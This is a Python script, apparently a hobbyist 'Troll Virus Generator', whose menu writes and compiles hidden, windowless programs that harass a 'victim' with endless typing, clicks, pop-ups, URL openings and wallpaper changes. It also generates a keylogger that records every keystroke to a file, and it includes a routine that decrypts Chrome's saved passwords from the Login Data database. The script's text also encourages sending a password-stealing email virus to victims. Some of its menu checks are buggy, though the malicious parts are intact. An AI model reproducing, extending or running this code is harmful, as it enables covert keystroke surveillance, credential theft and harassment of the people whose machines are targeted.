import os, pynput, socket
import imp, pip
from os import getenv
import sqlite3
import win32crypt


os.system("cls")
print("""\033[1;35;40m 

             ______         ____        _   ___                      _____       
            /_  __/______  / / / ____  | | / (_)_____ _____   ____  / ___/__ ___ 
             / / / __/ _ \/ / / /___/  | |/ / / __/ // (_-<  /___/ / (_ / -_) _ |
            /_/ /_/  \___/_/_/         |___/_/_/  \_,_/___/        \___/\__/_//_/
                                                                     

                                  || A Simple Virus Generator ||  
    """)

def __main__():
    #Definations.

    def MagicText():
        file = input("[!] Enter File Name (Enter ONLY name not it's TYPE! Eg : file | not file.txt) : ")
        virus = open(file+".pyw", "w")
        text = input("[!] Enter MagicText  : ")
        #CREATE VIRUS
        virus.write("from pynput.keyboard import Key, Controller \n")
        virus.write("import time\n")
        virus.write("while True :\n")
        virus.write("   msg = '"+text+"'\n")
        virus.write('   time.sleep(10)\n')
        virus.write("   keyboard = Controller()\n")
        virus.write("   keyboard.type(msg)")
        virus.close()
       
        print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
        
        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
        if(exe == "Y" or "y"):
            os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
            print("\033[1;33;40mVirus Script Compiled Successfully.")
            __main__()
        elif(exe == "N" or "n"):
            print("\033[1;34;40m[+] Virus has been Created.")
            __main__()
        else:
            print("\033[1;31;40m[-] Error")
            input("")
            __main__()


    def MagicDesktop():
        file = input("[!] Enter File Name (Enter ONLY name not it's TYPE! Eg : file | not file.txt) : ")
        virus = open(file+".pyw", "w")
        virus.write("import ctypes, time\n")
        virus.write("while True:\n")
        virus.write("   time.sleep(20)\n")
        virus.write("   SPI_SETDESKWALLPAPER = 20\n")
        virus.write("   ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, 'image.jpg' , 0)")
        virus.close()
        print("[!] MagicDesktop Virus is Generated. Put your Background Image in the Same folder as MagicDesktop-Virus AND NAME IT \033[1;39;40mimage \033[1;32;40mit will Work in 20 Seconds..")
        print("[!] FILE EXITS",os.path.isfile(file+".pyw"))

        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
        if(exe == "Y" or "y"):
            os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
            print("\033[1;33;40mVirus Script Compiled Successfully.")
            __main__()
        elif(exe == "N" or "n"):
            print("\033[1;34;40m[+] Virus has been Created.")
            __main__()
        else:
            print("\033[1;31;40m[-] Error")
            input("")
            __main__()


    def MagicClicks():
        file = input("[!] Enter File Name (Enter ONLY name not it's TYPE! Eg : file | not file.txt) : ")
        virus = open(file+".pyw", "w")

        #CREATE VIRUS
        virus.write("from pynput.mouse import Button, Controller \n")
        virus.write("import time\n")
        virus.write("while True :\n")
        virus.write('   time.sleep(5)\n')
        virus.write("   mouse = Controller()\n")
        virus.write("   mouse.click(Button.left, 2)")
        virus.close()
       
        print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
        if(exe == "Y" or "y"):
            os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
            print("\033[1;33;40mVirus Script Compiled Successfully.")
            __main__()
        elif(exe == "N" or "n"):
            print("\033[1;34;40m[+] Virus has been Created.")
            __main__()
        else:
            print("\033[1;31;40m[-] Error")
            input("")
            __main__()

    def TrollText():
        file = input("[!] Enter File Name (Enter ONLY name not it's TYPE! Eg : file | not file.txt) : ")
        virus = open(file+".pyw", "w")

        title = input("[*] Enter MessageBox Title : ")
        BoxText = input("[!] Enter MessageBox Text : ")
        #CREATE VIRUS
        virus.write("from tkinter import messagebox\n")
        virus.write("from tkinter import *\n")
        virus.write("import time\n")
        virus.write("root = Tk()\n")
        virus.write("root.withdraw()\n")
        virus.write("while True:\n")
        virus.write("  time.sleep(10) \n")
        virus.write("  messagebox.showinfo('"+title+"','"+BoxText+"')")
        virus.close()
       
        print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
        if(exe == "Y" or "y"):
            os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
            print("\033[1;33;40mVirus Script Compiled Successfully.")
            __main__()
        elif(exe == "N" or "n"):
            print("\033[1;34;40m[+] Virus has been Created.")
            __main__()
        else:
            print("\033[1;31;40m[-] Error")
            input("")
            __main__()


    def TrollURL():
        file = input("[!] Enter File Name (Enter ONLY name not it's TYPE! Eg : file | not file.txt) : ")
        virus = open(file+".pyw", "w")

        url = input("[!] Enter URL  : ")
        virus.write("import webbrowser\n")
        virus.write("import time\n")
        virus.write("def openURL():\n")
        virus.write("  time.sleep(60)\n")
        virus.write("  webbrowser.open('"+url+"')\n")
        virus.write("  time.sleep(30)\n")
        virus.write("while True:\n")
        virus.write("  openURL()\n")
        virus.close()
        print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
        if(exe == "Y" or "y"):
            os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
            print("\033[1;33;40mVirus Script Compiled Successfully.")
            __main__()
        elif(exe == "N" or "n"):
            print("\033[1;34;40m[+] Virus has been Created.")
            __main__()
        else:
            print("\033[1;31;40m[-] Error")
            input("")
            __main__()

    def txtKeylog():
        file = input("[!] Enter file name (Enter ONLY file name not it's TYPE! Eg : file | not file.txt) : ")
        virus = open(file+".pyw", "w")
        virus.write("from pynput.keyboard import Key, Listener\n")
        virus.write("import logging\n")


        virus.write("log = ''\n")

        virus.write("logging.basicConfig(filename=(log + 'keylog.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')\n")

        virus.write("def on_press(key):\n")
        virus.write("    logging.info(key)\n")

        virus.write("with Listener(on_press=on_press) as listener:\n")
        virus.write("    listener.join()")
        virus.close()

        print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
        if(exe == "Y" or "y"):
            os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
            print("\033[1;33;40mVirus Script Compiled Successfully.")
            __main__()
        elif(exe == "N" or "n"):
            print("\033[1;34;40m[+] Virus has been Created.")
            __main__()
        else:
            print("\033[1;31;40m[-] Error")
            input("")
            __main__()

    def virus():
        print("[+] Virus Generation for Troll. ")
        print("\033[1;37;40mSelect Virus Type : ")
        print("\033[1;34;40m[*] All the Useless Stuff for People Learning :")
        print("\033[1;33;40m[1] MagicText - Automatically Writes Text every 10 Seconds to Scare the shit out of Victim.")
        print("[2] MagicDesktop - Automatically Changes Desktop Wallpaper from time to time.")
        print("[3] MagicClicks - Automatically Right/Left Click to Scare the shit out of Victim.")
        print("[4] TrollText - Display random Message Boxes")
        print("[5] TrollURL - Automatically open a Specified URL.")
        print("[6] Normal log to .txt Keylogger")
        print("\033[1;34;40m[*] For Hackers : ")
        print("\033[1;33;40m[7] Anti-Chrome - Decrypt your Chrome Passwords.")
        type = input("\033[1;32;40mFastCorp>\033[1;37;40m$~/Virus Type : \033[1;32;40m")
        if(type == "1"):
            print("[*] You have selected type MagicText.")
            print("[+] Now starting Virus Generation.")
            MagicText() 
        elif(type == "2"):
            print("[*] You have selected type MagicDesktop.")
            print("[+] Now starting Virus Generation.")
            MagicDesktop()
        elif(type == "3"):
            print("[*] You have selected type MagicClicks.")
            print("[+] Now starting Virus Generation.")
            MagicClicks()
        elif(type == "4"):
            print("[*] You have selected type TrollText.")
            print("[+] Now starting Virus Generation.")
            TrollText()
        elif(type == "5"):
            print("[*] You have Selected TrollURL.")
            print("[+] Now starting Virus Generation.")
            TrollURL()
        elif(type == "6"):
            print("[*] You have Selected LogToText Keylogger.")
            print("[+] Now starting Virus Generation.")
            txtKeylog()

        elif(type == "7"):
            print("[+] Make sure Chrome is off!")
            print("[+] This isn't exactly a Virus.")
            print("[+] A Email Sending Virus available on GitHub that you can send to your Victim and get his passwords.")
            check = input("[!] We Cool? (Y/N) :")
            if(check == "Y" or "y"):
                print("[!] OK! Now Proceeding..")
                sysname = socket.gethostname()
                conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data") 
                cursor = conn.cursor()
                cursor.execute('Select action_url, username_value, password_value FROM logins')
                passfile = open(sysname+".txt", "w")
                passfile.write("Chrome Saved Passwords From PC : "+sysname+"\n")
                for result in cursor.fetchall():
                    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
                    if password:
                        passfile.write('\nThe website is '+result[0])
                        passfile.write('\nThe Username is '+result[1])
                        passfile.write('\n The password is ' + str(password))
                
                print("[+] Done!")
                input("")
                __main__()
            elif(check == "n" or "N"):
                print("[+] Ok.")
                input("")
                __main__()
        else:
            print("[-] Invalid Option.")
            __main__()

    #All the Work THIS IS __MAIN__
    cmd = input("\033[1;32;40mFastCorp>")
    if(cmd == "help"):
        print("[*] Troll-Virus-Generator")
        print("[+] HELP : ")
        print("[+] help - Print this help message")
        print("[+] virus - Start Virus Generation.")
        print("[+] firstrun - Check & install required Modules")
        print("[+] info - Display information")
        print("[+] exit - Obvious.")
        __main__()
    elif(cmd == "virus"):
        virus()
    elif(cmd == "exit"):
        SystemExit()
        exit
    elif(cmd == "firstrun"):
        print("[*] Run the Setup script to install required modules.")
        input("")
        __main__()
    elif(cmd == "info"):
        print("Troll-Virus-Gen")
        print("Coded by : F.A.S.T")
        input("")
        __main__()
    else:
        print("[-] Invalid Option.")
        __main__()



if __name__ == __main__():
    '__main__'


